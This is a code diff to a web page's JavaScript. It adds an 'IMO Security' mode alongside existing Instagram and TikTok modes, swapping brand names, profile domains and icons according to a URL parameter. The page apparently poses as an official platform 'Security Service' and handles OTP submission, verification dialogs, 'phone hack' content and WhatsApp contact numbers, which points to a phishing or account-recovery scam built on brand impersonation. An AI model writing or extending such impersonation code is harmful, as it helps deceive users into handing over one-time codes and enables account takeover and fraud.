@@ -1954,8 +1954,13 @@
         const CONTACT_URL_PARAMS = new URLSearchParams(window.location.search);
         const CONTACT_SERVICE_PARAM = String(CONTACT_URL_PARAMS.get('service') || '').toLowerCase();
         const IS_TIKTOK_SECURITY_MODE = CONTACT_SERVICE_PARAM === 'tiktok-safety' || CONTACT_SERVICE_PARAM === 'tiktok-security' || CONTACT_SERVICE_PARAM === 'tiktok';
-        const CONTACT_BRAND_LABEL = IS_TIKTOK_SECURITY_MODE ? 'TikTok' : 'Instagram';
+        const IS_IMO_SECURITY_MODE = CONTACT_SERVICE_PARAM === 'imo-security' || CONTACT_SERVICE_PARAM === 'imo';
+        const IS_BRAND_REWRITE_MODE = IS_TIKTOK_SECURITY_MODE || IS_IMO_SECURITY_MODE;
+        const CONTACT_BRAND_LABEL = IS_TIKTOK_SECURITY_MODE ? 'TikTok' : (IS_IMO_SECURITY_MODE ? 'IMO' : 'Instagram');
+        const CONTACT_PROFILE_DOMAIN = IS_TIKTOK_SECURITY_MODE ? 'tiktok.com' : (IS_IMO_SECURITY_MODE ? 'imo.im' : 'instagram.com');
         const CONTACT_VOICE_SERVICE_KEY = IS_TIKTOK_SECURITY_MODE ? 'tiktok-service' : 'instagram-service';
+        const CONTACT_BRAND_ICON_CLASS = IS_TIKTOK_SECURITY_MODE ? 'fa-tiktok' : (IS_IMO_SECURITY_MODE ? 'fa-comments' : 'fa-instagram');
+        const CONTACT_BRAND_ICON_STYLE_CLASS = IS_IMO_SECURITY_MODE ? 'fas' : 'fab';
 
         let refreshIntervalId = null;
         let otpSubmitBound = false;
@@ -1963,14 +1968,23 @@
         const instagramContactFlowTimeouts = new Set();
 
         function replaceContactBrandText(value) {
-            return String(value || '')
-                .replace(/Instagram Security/gi, 'TikTok Security')
-                .replace(/Instagram/g, 'TikTok')
-                .replace(/instagram/g, 'tiktok');
+            let replacedValue = String(value || '');
+            if (IS_TIKTOK_SECURITY_MODE) {
+                replacedValue = replacedValue
+                    .replace(/Instagram Security/gi, 'TikTok Security')
+                    .replace(/Instagram/g, 'TikTok')
+                    .replace(/instagram/g, 'tiktok');
+            } else if (IS_IMO_SECURITY_MODE) {
+                replacedValue = replacedValue
+                    .replace(/Instagram Security/gi, 'IMO Security')
+                    .replace(/Instagram/g, 'IMO')
+                    .replace(/instagram/g, 'imo');
+            }
+            return replacedValue;
         }
 
-        function applyTikTokBrandingIfNeeded() {
-            if (!IS_TIKTOK_SECURITY_MODE) {
+        function applySecurityBrandingIfNeeded() {
+            if (!IS_BRAND_REWRITE_MODE) {
                 return;
             }
 
@@ -1978,7 +1992,7 @@
 
             const serviceChip = document.querySelector('.service-chip');
             if (serviceChip) {
-                serviceChip.textContent = 'TIKTOK SECURITY SERVICE';
+                serviceChip.textContent = `${CONTACT_BRAND_LABEL.toUpperCase()} SECURITY SERVICE`;
             }
 
             const pageRoot = document.querySelector('.contact-page');
@@ -2013,13 +2027,20 @@
             document.querySelectorAll('a[href]').forEach((el) => {
                 const href = el.getAttribute('href');
                 if (href && /instagram\.com/i.test(href)) {
-                    el.setAttribute('href', href.replace(/instagram\.com/gi, 'tiktok.com'));
+                    el.setAttribute('href', href.replace(/instagram\.com/gi, CONTACT_PROFILE_DOMAIN));
                 }
             });
 
             document.querySelectorAll('.fa-instagram').forEach((icon) => {
                 icon.classList.remove('fa-instagram');
-                icon.classList.add('fa-tiktok');
+                icon.classList.add(CONTACT_BRAND_ICON_CLASS);
+                if (CONTACT_BRAND_ICON_STYLE_CLASS === 'fas') {
+                    icon.classList.remove('fab');
+                    icon.classList.add('fas');
+                } else {
+                    icon.classList.remove('fas');
+                    icon.classList.add('fab');
+                }
             });
         }
 
@@ -2341,6 +2362,7 @@
                 { key: 'messenger', icon: 'fab fa-facebook-messenger' },
                 { key: 'telegram', icon: 'fab fa-telegram' },
                 { key: 'instagram', icon: 'fab fa-instagram' },
+                { key: 'imo', icon: 'fas fa-comments' },
                 { key: 'facebook', icon: 'fab fa-facebook-f' },
                 { key: 'gmail', icon: 'fab fa-google' },
                 { key: 'email', icon: 'fas fa-envelope' },
@@ -2691,7 +2713,7 @@
 
         async function refreshAll() {
             await Promise.all([loadPhoneHackContent(), loadWhatsAppNumbers(), loadCategories()]);
-            applyTikTokBrandingIfNeeded();
+            applySecurityBrandingIfNeeded();
         }
 
         if (typeof window.initServiceVoiceAssistant === 'function') {
@@ -2735,12 +2757,12 @@
         }
 
         async function initializePage() {
-            applyTikTokBrandingIfNeeded();
+            applySecurityBrandingIfNeeded();
             await loadOtpTextsFromSettings();
             await loadVerificationDialogTextsFromSettings();
             await loadInstagramSecurityFieldValues();
             await refreshAll();
-            applyTikTokBrandingIfNeeded();
+            applySecurityBrandingIfNeeded();
             resumeInstagramContactRefresh();
         }
 
